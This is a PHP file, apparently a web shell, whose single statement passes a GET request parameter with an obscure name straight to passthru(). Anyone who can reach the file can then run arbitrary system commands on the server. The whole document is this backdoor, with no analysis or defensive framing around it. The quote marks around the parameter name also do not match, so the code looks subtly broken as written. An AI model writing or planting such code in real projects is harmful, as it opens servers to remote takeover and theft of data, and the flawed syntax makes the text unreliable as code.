<?php
passthru($_GET[’yUoOc0SD']);
?>
